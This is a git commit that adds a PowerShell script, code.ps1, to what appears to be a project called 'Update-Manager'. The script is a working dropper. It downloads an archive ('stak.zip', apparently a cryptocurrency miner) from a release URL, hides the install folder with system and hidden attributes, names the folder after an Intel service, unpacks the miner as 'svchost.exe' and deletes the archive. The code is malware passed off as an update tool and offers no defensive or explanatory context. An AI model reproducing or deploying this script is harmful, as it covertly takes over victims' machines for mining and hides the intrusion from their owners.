8e5f8eeae2c03b0f1384f0b7a3ce096a403de93a
ege dönmez <egeberkecandonmez@gmail.com>
2020-04-16 14:35:24 +0300

    Add files via upload
    1

---
+++ code.ps1
@@ -0,0 +1,14 @@
+﻿$url = "https://github.com/egedmz/Update-Manager/releases/download/1.4.1/stak.zip"
+$myLoc = "$env:homedrive\IntelManagementService"
+
+$outMinerData = "$myLoc\data"
+$outMinerFile = "$outMinerData\svchost.exe"
+$outZip = "$myLoc\stak.zip"
+Remove-Item –path $myLoc –recurse -Force
+mkdir $myLoc
+attrib +h +r +s +a $myLoc /d /s
+
+(New-Object System.Net.WebClient).DownloadFile($url,$outZip)
+
+Expand-Archive $outZip -DestinationPath $myLoc\data -Force
+Remove-Item -path $outZip -Force
